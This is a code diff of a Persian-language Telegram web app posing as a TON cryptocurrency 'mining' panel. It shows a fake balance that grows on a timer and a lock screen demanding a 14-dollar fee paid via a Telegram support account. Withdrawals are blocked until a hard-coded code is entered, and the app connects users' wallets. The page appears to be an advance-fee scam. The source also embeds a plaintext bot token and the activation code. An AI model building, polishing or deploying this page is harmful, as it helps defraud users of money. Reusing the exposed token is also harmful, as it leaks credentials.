@@ -10,161 +10,322 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700;900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700;900&display=swap');
         
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            margin: 0; font-family: 'Vazirmatn', sans-serif;
-            background: #0b1019; color: #fff; padding: 15px; direction: rtl; min-height: 100vh;
+            font-family: 'Vazirmatn', sans-serif;
+            background: #0b1019;
+            color: #fff;
+            padding: 15px;
+            direction: rtl;
+            min-height: 100vh;
         }
 
         /* کادر شناور برداشت */
         #toast {
-            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
-            background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.2);
-            color: #fff; padding: 12px 25px; border-radius: 50px; font-size: 13px;
-            font-weight: bold; z-index: 200000; transition: 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: flex; align-items: center; gap: 10px; width: max-content;
+            position: fixed;
+            top: -100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: #fff;
+            padding: 12px 25px;
+            border-radius: 50px;
+            font-size: 13px;
+            font-weight: bold;
+            z-index: 200000;
+            transition: 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            width: max-content;
         }
         #toast.show { top: 30px; }
 
         /* کارت پروفایل */
         .card-profile {
-            background: #161d27; border-radius: 20px; padding: 15px;
-            margin-bottom: 12px; border: 1px solid #242c37;
-            display: flex; align-items: center; justify-content: flex-start; gap: 15px;
+            background: #161d27;
+            border-radius: 20px;
+            padding: 15px;
+            margin-bottom: 12px;
+            border: 1px solid #242c37;
+            display: flex;
+            align-items: center;
+            gap: 15px;
             position: relative;
         }
-        .profile-text { text-align: right; flex-grow: 1; order: 1; }
-        .profile-text h3 { margin: 0; font-size: 15px; color: #fff; }
-        .profile-text p { margin: 0; font-size: 12px; color: #00c6ff; }
-        
-        .avatar-container { 
-            width: 60px; height: 60px; border-radius: 50%; 
-            background: linear-gradient(135deg, #00c6ff, #0072ff); overflow: hidden;
-            display: flex; align-items: center; justify-content: center;
-            border: 2px solid #242c37; flex-shrink: 0; order: 2;
+        .profile-text {
+            flex: 1;
         }
-        .avatar-container img { width: 100%; height: 100%; object-fit: cover; }
-        .avatar-container i { font-size: 30px; color: #fff; }
+        .profile-text h3 {
+            margin: 0;
+            font-size: 15px;
+            color: #fff;
+        }
+        .profile-text p {
+            margin: 0;
+            font-size: 12px;
+            color: #00c6ff;
+        }
+        
+        .avatar-container {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00c6ff, #0072ff);
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid #242c37;
+            flex-shrink: 0;
+        }
+        .avatar-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .avatar-container i {
+            font-size: 30px;
+            color: #fff;
+        }
 
-        /* نشان سطح کاربر - کلیک‌پذیر */
+        /* نشان سطح کاربر */
         .level-badge {
-            position: absolute; bottom: -8px; right: 20px;
+            position: absolute;
+            bottom: -8px;
+            right: 20px;
             background: linear-gradient(90deg, #ffd700, #ffa500);
-            color: #000; font-size: 10px; font-weight: bold;
-            padding: 3px 12px; border-radius: 50px; border: 2px solid #161d27;
-            cursor: pointer; transition: 0.3s; z-index: 10;
+            color: #000;
+            font-size: 10px;
+            font-weight: bold;
+            padding: 3px 12px;
+            border-radius: 50px;
+            border: 2px solid #161d27;
+            cursor: pointer;
+            transition: 0.3s;
+            z-index: 10;
         }
         .level-badge:hover { transform: scale(1.05); }
 
         /* کادر شیشه‌ای سطوح */
         #levelModal {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.5); backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px); z-index: 300000;
-            display: flex; align-items: center; justify-content: center;
-            opacity: 0; visibility: hidden; transition: 0.3s;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            z-index: 300000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: 0.3s;
         }
-        #levelModal.show { opacity: 1; visibility: visible; }
+        #levelModal.show {
+            opacity: 1;
+            visibility: visible;
+        }
         
         .level-glass-card {
-            background: rgba(22, 29, 39, 0.8); backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 30px; padding: 25px 20px; width: 85%; max-width: 320px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5); transform: translateY(20px);
+            background: rgba(22, 29, 39, 0.8);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 30px;
+            padding: 25px 20px;
+            width: 85%;
+            max-width: 320px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            transform: translateY(20px);
             transition: 0.4s;
         }
-        #levelModal.show .level-glass-card { transform: translateY(0); }
+        #levelModal.show .level-glass-card {
+            transform: translateY(0);
+        }
         
         .level-header {
-            display: flex; align-items: center; justify-content: space-between;
-            margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid rgba(255,255,255,0.1);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
         }
-        .level-header h3 { margin: 0; font-size: 18px; color: #ffd700; }
+        .level-header h3 {
+            margin: 0;
+            font-size: 18px;
+            color: #ffd700;
+        }
         .close-btn {
-            background: rgba(255,255,255,0.1); border: none; color: #fff;
-            width: 35px; height: 35px; border-radius: 50%; cursor: pointer;
-            display: flex; align-items: center; justify-content: center;
+            background: rgba(255,255,255,0.1);
+            border: none;
+            color: #fff;
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         
         .level-item {
-            display: flex; align-items: center; justify-content: space-between;
-            padding: 12px 15px; margin-bottom: 8px; border-radius: 15px;
-            background: rgba(255,255,255,0.05); border: 1px solid transparent;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 15px;
+            margin-bottom: 8px;
+            border-radius: 15px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid transparent;
         }
         .level-item.active {
-            border-color: #ffd700; background: rgba(255, 215, 0, 0.1);
+            border-color: #ffd700;
+            background: rgba(255, 215, 0, 0.1);
             box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
         }
         .level-name { font-weight: bold; }
         .level-req { font-size: 12px; color: #00ff9d; }
 
+        /* کارت اصلی */
         .card {
-            background: #161d27; border-radius: 20px; padding: 22px;
-            margin-bottom: 12px; border: 1px solid #242c37; text-align: center;
+            background: #161d27;
+            border-radius: 20px;
+            padding: 22px;
+            margin-bottom: 12px;
+            border: 1px solid #242c37;
+            text-align: center;
         }
-        #balance { font-size: 45px; font-weight: 900; color: #00c6ff; display: block; margin: 5px 0; }
+        #balance {
+            font-size: 45px;
+            font-weight: 900;
+            color: #00c6ff;
+            display: block;
+            margin: 5px 0;
+        }
 
         /* آمار */
         .stats-grid {
-            display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 10px;
         }
         .stat-item {
-            background: #1e2732; border-radius: 15px; padding: 10px; text-align: center;
+            background: #1e2732;
+            border-radius: 15px;
+            padding: 10px;
+            text-align: center;
         }
-        .stat-value { font-size: 18px; font-weight: bold; color: #00c6ff; }
-        .stat-label { font-size: 11px; color: #888; }
+        .stat-value {
+            font-size: 18px;
+            font-weight: bold;
+            color: #00c6ff;
+        }
+        .stat-label {
+            font-size: 11px;
+            color: #888;
+        }
 
-        /* دکمه‌ها - همه یک اندازه */
+        /* دکمه‌ها */
         .btn {
-            width: 100%; height: 58px; border-radius: 20px; border: none;
-            font-size: 16px; font-weight: 700; cursor: pointer; display: flex;
-            align-items: center; justify-content: center; gap: 10px; color: #fff; 
-            text-decoration: none; margin-bottom: 12px; box-sizing: border-box;
+            width: 100%;
+            height: 58px;
+            border-radius: 20px;
+            border: none;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            color: #fff;
+            text-decoration: none;
+            margin-bottom: 12px;
+            transition: 0.3s;
+        }
+        .btn:active {
+            transform: scale(0.98);
+            opacity: 0.9;
         }
 
-        /* دکمه ولت - اصلاح نهایی برای حذف لوگوی اضافی */
+        /* دکمه ولت - یکپارچه */
         #ton-connect-btn {
-            width: 100%; height: 58px !important; margin-bottom: 12px;
+            width: 100%;
+            height: 58px;
+            margin-bottom: 12px;
         }
-        #ton-connect-btn * { 
-            width: 100% !important; height: 58px !important; 
-            border-radius: 20px !important; display: flex !important;
-            justify-content: center !important; align-items: center !important;
-            background: #0088cc !important; border: none !important;
+        
+        .tc-root-element,
+        .tc-root-element > div,
+        .tc-button,
+        .tc-button__wrapper,
+        .tc-button__inner {
+            width: 100% !important;
+            height: 58px !important;
+            border-radius: 20px !important;
+            background: #0088cc !important;
+            border: none !important;
+            box-shadow: none !important;
             font-family: 'Vazirmatn', sans-serif !important;
-            font-size: 16px !important; font-weight: 700 !important;
-            color: #fff !important; margin: 0 !important; padding: 0 20px !important;
-            box-sizing: border-box !important;
-        }
-        
-        /* حذف کامل هرگونه لوگو یا آیکون اضافی */
-        #ton-connect-btn svg, 
-        #ton-connect-btn img,
-        #ton-connect-btn [class*="icon"],
-        #ton-connect-btn [class*="logo"],
-        #ton-connect-btn button > *:not(span):not(div) { 
-            display: none !important; 
-        }
-        
-        /* اضافه کردن آیکون کیف پول ساده و مرتب */
-        #ton-connect-btn button::before {
-            content: "\f555"; 
-            font-family: "Font Awesome 6 Free"; 
-            font-weight: 900;
-            margin-left: 8px; 
-            font-size: 16px; 
-            color: #fff;
-            display: inline-block;
-        }
-        
-        /* تنظیم متن دکمه */
-        #ton-connect-btn button span {
-            color: #fff !important; 
             font-size: 16px !important;
-            font-weight: 700 !important; 
+            font-weight: 700 !important;
+            color: #fff !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            position: relative !important;
+            overflow: hidden !important;
+        }
+
+        /* پنهان کردن تمام عناصر اضافی */
+        .tc-root-element svg,
+        .tc-root-element img,
+        .tc-root-element picture,
+        .tc-button__icon,
+        [class*="icon"],
+        [class*="logo"] {
+            display: none !important;
+        }
+
+        /* اضافه کردن آیکون با ::before */
+        .tc-root-element::before,
+        .tc-button::before,
+        .tc-button__inner::before {
+            content: "\f555" !important;
+            font-family: "Font Awesome 6 Free" !important;
+            font-weight: 900 !important;
+            font-size: 18px !important;
+            margin-left: 10px !important;
+            color: #fff !important;
+            display: inline-block !important;
+            position: static !important;
+            transform: none !important;
+        }
+
+        /* تنظیم متن */
+        .tc-root-element span,
+        .tc-button span {
             font-family: 'Vazirmatn', sans-serif !important;
+            font-size: 16px !important;
+            font-weight: 700 !important;
+            color: #fff !important;
             margin: 0 !important;
             padding: 0 !important;
         }
@@ -176,59 +337,162 @@
 
         /* تب‌ها */
         .tabs {
-            display: flex; gap: 10px; margin-bottom: 15px; overflow-x: auto; padding: 5px 0;
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+            overflow-x: auto;
+            padding: 5px 0;
         }
         .tab {
-            background: #1c2431; padding: 10px 20px; border-radius: 20px; font-size: 14px;
-            white-space: nowrap; cursor: pointer; transition: 0.3s;
+            background: #1c2431;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            white-space: nowrap;
+            cursor: pointer;
+            transition: 0.3s;
         }
         .tab.active { background: #0088cc; }
 
         /* بخش رفرال */
         .referral-section {
-            background: #1e2732; border-radius: 20px; padding: 15px; margin-bottom: 12px;
-            border: 1px solid #333; display: none;
+            background: #1e2732;
+            border-radius: 20px;
+            padding: 15px;
+            margin-bottom: 12px;
+            border: 1px solid #333;
+            display: none;
         }
         .referral-section.show { display: block; }
 
         .referral-link-box {
-            background: #0b1019; border-radius: 15px; padding: 12px;
-            display: flex; align-items: center; justify-content: space-between;
-            border: 1px solid #333; margin: 10px 0;
+            background: #0b1019;
+            border-radius: 15px;
+            padding: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid #333;
+            margin: 10px 0;
         }
         .copy-btn {
-            background: #0088cc; border: none; color: #fff; padding: 8px 15px;
-            border-radius: 12px; cursor: pointer; font-size: 12px;
+            background: #0088cc;
+            border: none;
+            color: #fff;
+            padding: 8px 15px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 12px;
         }
 
         /* تاریخچه */
         .history-item {
-            display: flex; align-items: center; justify-content: space-between;
-            padding: 12px; border-bottom: 1px solid #242c37;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px;
+            border-bottom: 1px solid #242c37;
         }
         .history-item:last-child { border-bottom: none; }
 
-        /* پاپ‌آپ فعالسازی */
+        /* پاپ‌آپ فعالسازی - اصلاح شده */
         #feeModal {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #0b1019; z-index: 100000; display: flex; align-items: center; justify-content: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(11, 16, 25, 0.95);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            z-index: 100000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
         }
         .modal-content {
-            background: #1c1c1c; padding: 30px 18px; border-radius: 30px; width: 92%; text-align: center;
-            border: 1px solid #333; box-sizing: border-box;
+            background: #1c1c1c;
+            padding: 30px 20px;
+            border-radius: 30px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            border: 1px solid #333;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+        }
+        .modal-content i.fa-lock {
+            font-size: 50px;
+            color: #ff512f;
+            margin-bottom: 20px;
+        }
+        .modal-content h2 {
+            font-size: 22px;
+            margin-bottom: 20px;
+            color: #fff;
         }
         .pay-notice {
-            background: rgba(0, 0, 0, 0.2); border: 1.5px solid #ffc107;
-            color: #ffc107; padding: 15px; border-radius: 20px; font-size: 11px; 
-            margin-bottom: 20px; line-height: 1.8; text-align: justify;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1.5px solid #ffc107;
+            color: #ffc107;
+            padding: 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-bottom: 20px;
+            line-height: 1.8;
+            text-align: justify;
         }
-        .fee-tag { border: 2px dashed #00ff9d; color: #00ff9d; padding: 15px; border-radius: 25px; font-weight: 800; font-size: 18px; margin-bottom: 20px; display: block; }
+        .fee-tag {
+            border: 2px dashed #00ff9d;
+            color: #00ff9d;
+            padding: 15px;
+            border-radius: 25px;
+            font-weight: 800;
+            font-size: 20px;
+            margin-bottom: 25px;
+            background: rgba(0, 255, 157, 0.05);
+        }
         
         #activationInput {
-            width: 100%; height: 58px; border-radius: 20px; border: 1px solid #333;
-            background: #121212; color: #fff; text-align: center; font-size: 17px; margin-bottom: 12px; outline: none;
+            width: 100%;
+            height: 58px;
+            border-radius: 20px;
+            border: 1px solid #444;
+            background: #222;
+            color: #fff;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 500;
+            margin: 20px 0 12px;
+            outline: none;
+            transition: 0.3s;
+            font-family: 'Vazirmatn', sans-serif;
         }
+        #activationInput:focus {
+            border-color: #0088cc;
+            box-shadow: 0 0 0 2px rgba(0, 136, 204, 0.3);
+        }
+        #activationInput::placeholder {
+            color: #666;
+            font-size: 14px;
+        }
+
         .hidden { display: none !important; }
+
+        /* آدرس کیف پول */
+        .wallet-address {
+            background: #1e2732;
+            border-radius: 15px;
+            padding: 10px 15px;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #00c6ff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            border: 1px solid #333;
+        }
     </style>
 </head>
 <body>
@@ -246,21 +510,29 @@
     </div>
 </div>
 
+<!-- پاپ‌آپ فعالسازی -->
 <div id="feeModal">
     <div class="modal-content">
-        <i class="fas fa-lock" style="font-size: 60px; color: #ff512f; margin-bottom: 25px;"></i>
-        <h2 style="font-size: 20px; margin-bottom: 15px;">فعالسازی پنل کاربری</h2>
+        <i class="fas fa-lock"></i>
+        <h2>فعالسازی پنل کاربری</h2>
         <div class="pay-notice">
-            <i class="fas fa-exclamation-triangle"></i>
+            <i class="fas fa-exclamation-triangle" style="margin-left: 5px;"></i>
             جهت واریز مبلغ کارمزد شبکه، <b>فقط</b> اطلاعات پرداخت را از <b>پشتیبانی رسمی</b> دریافت کنید. هرگونه واریز به آدرس‌های غیررسمی منجر به مسدود شدن حساب می‌گردد.
         </div>
-        <div class="fee-tag">14 دلار | 2,226,000 تومان</div>
-        <a href="https://t.me/MiningerTonCoin" class="btn get-code-btn" target="_blank"><i class="fas fa-headset"></i> دریافت رمز و واریز</a>
-        <input type="text" id="activationInput" placeholder="Enter Code">
-        <button onclick="verifyActivation()" class="btn active-btn">فعالسازی و ورود به پنل</button>
+        <div class="fee-tag">
+            14 دلار | 2,226,000 تومان
+        </div>
+        <a href="https://t.me/MiningerTonCoin" class="btn get-code-btn" target="_blank">
+            <i class="fas fa-headset"></i> دریافت رمز و واریز
+        </a>
+        <input type="text" id="activationInput" placeholder="کد فعالسازی را وارد کنید">
+        <button onclick="verifyActivation()" class="btn active-btn">
+            <i class="fas fa-check-circle"></i> فعالسازی و ورود به پنل
+        </button>
     </div>
 </div>
 
+<!-- پروفایل کاربر -->
 <div class="card-profile">
     <div class="profile-text">
         <h3 id="uName">TONCOIN SUPPORT</h3>
@@ -273,10 +545,13 @@
     <span class="level-badge" id="userLevel" onclick="openLevelModal()">سطح 1</span>
 </div>
 
+<!-- کارت اصلی -->
 <div class="card">
     <p style="margin:0; font-size:13px; color:#aaa;">موجودی استخراج شده (TON)</p>
     <span id="balance">0.000000</span>
-    <div style="font-size:12px; color:#00ff9d; margin-top:8px;"><i class="fas fa-bolt"></i> <span id="miningRate">0.000012</span> TON/s</div>
+    <div style="font-size:12px; color:#00ff9d; margin-top:8px;">
+        <i class="fas fa-bolt"></i> <span id="miningRate">0.000012</span> TON/s
+    </div>
     
     <div class="stats-grid">
         <div class="stat-item">
@@ -290,8 +565,15 @@
     </div>
 </div>
 
-<!-- دکمه ولت - بدون لوگوی اضافی -->
+<!-- دکمه ولت -->
 <div id="ton-connect-btn"></div>
+
+<!-- آدرس کیف پول (بعد از اتصال نمایش داده میشه) -->
+<div id="walletAddress" class="wallet-address hidden">
+    <i class="fas fa-wallet"></i>
+    <span id="walletAddressText"></span>
+    <i class="fas fa-copy copy-icon" onclick="copyWalletAddress()" style="cursor: pointer;"></i>
+</div>
 
 <!-- تب‌ها -->
 <div class="tabs">
@@ -307,7 +589,9 @@
     
     <div class="referral-link-box">
         <span id="referralLink" style="font-size:12px;">در حال بارگذاری...</span>
-        <button class="copy-btn" onclick="copyReferralLink()">کپی لینک</button>
+        <button class="copy-btn" onclick="copyReferralLink()">
+            <i class="fas fa-copy"></i> کپی
+        </button>
     </div>
     
     <div class="stats-grid" style="margin-top:10px;">
@@ -333,14 +617,20 @@
 </div>
 
 <!-- دکمه‌های اصلی -->
-<div style="padding: 0 5px;">
-    <button id="withdrawBtn" class="btn withdraw-btn"><i class="fas fa-arrow-up-from-bracket"></i> درخواست برداشت آنی</button>
-    <a href="https://t.me/MiningerTonCoin" class="btn support-btn" target="_blank"><i class="fas fa-headset"></i> پشتیبانی آنلاین</a>
+<div style="padding: 0;">
+    <button id="withdrawBtn" class="btn withdraw-btn">
+        <i class="fas fa-arrow-up-from-bracket"></i> درخواست برداشت آنی
+    </button>
+    <a href="https://t.me/MiningerTonCoin" class="btn support-btn" target="_blank">
+        <i class="fas fa-headset"></i> پشتیبانی آنلاین
+    </a>
 </div>
 
 <script>
     const tg = window.Telegram.WebApp;
-    tg.ready(); tg.expand();
+    tg.ready();
+    tg.expand();
+    tg.enableClosingConfirmation();
 
     const SECRET_CODE = "T61O96N12";
     const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
@@ -470,6 +760,13 @@
         });
     }
 
+    function copyWalletAddress() {
+        const address = document.getElementById('walletAddressText').innerText;
+        navigator.clipboard.writeText(address).then(() => {
+            showToast('آدرس کیف پول کپی شد!');
+        });
+    }
+
     window.switchTab = function(tab) {
         document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
         event.target.classList.add('active');
@@ -492,9 +789,9 @@
         const val = document.getElementById('activationInput').value.trim();
         if(val === SECRET_CODE) {
             localStorage.setItem('isActivated', 'true');
-            document.getElementById('feeModal').remove();
+            document.getElementById('feeModal').style.display = 'none';
             notifyAdmin("✅ فعالسازی موفقیت‌آمیز");
-            tg.showAlert("پنل با موفقیت فعال شد!");
+            showToast("پنل با موفقیت فعال شد!");
             addToHistory('فعالسازی', 'پنل فعال شد');
         } else {
             tg.showAlert("کد اشتباه است ❌");
@@ -543,16 +840,34 @@
         updateUserLevel();
     }, 1000);
 
-    // تنظیمات ولت با لوگوی ساده
+    // تنظیمات ولت
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json',
         buttonRootId: 'ton-connect-btn'
     });
 
+    // نمایش آدرس کیف پول بعد از اتصال
+    tonConnectUI.onStatusChange(wallet => {
+        if (wallet) {
+            const address = wallet.account.address;
+            const shortAddress = address.slice(0, 4) + '...' + address.slice(-4);
+            document.getElementById('walletAddressText').innerText = shortAddress;
+            document.getElementById('walletAddress').classList.remove('hidden');
+        } else {
+            document.getElementById('walletAddress').classList.add('hidden');
+        }
+    });
+
     document.getElementById('withdrawBtn').onclick = () => {
-        if(localStorage.getItem('isActivated') !== 'true') return tg.showAlert("ابتدا فعالسازی کنید");
+        if(localStorage.getItem('isActivated') !== 'true') {
+            tg.showAlert("ابتدا فعالسازی کنید");
+            return;
+        }
         
-        if(bal <= 0) return tg.showAlert("موجودی شما صفر است");
+        if(bal <= 0) {
+            tg.showAlert("موجودی شما صفر است");
+            return;
+        }
 
         const amountToWithdraw = bal;
         
@@ -580,6 +895,13 @@
 
     updateHistoryDisplay();
     updateUserLevel();
+
+    // بستن مودال با کلیک روی ESC
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') {
+            closeLevelModal();
+        }
+    });
 </script>
 </body>
 </html>
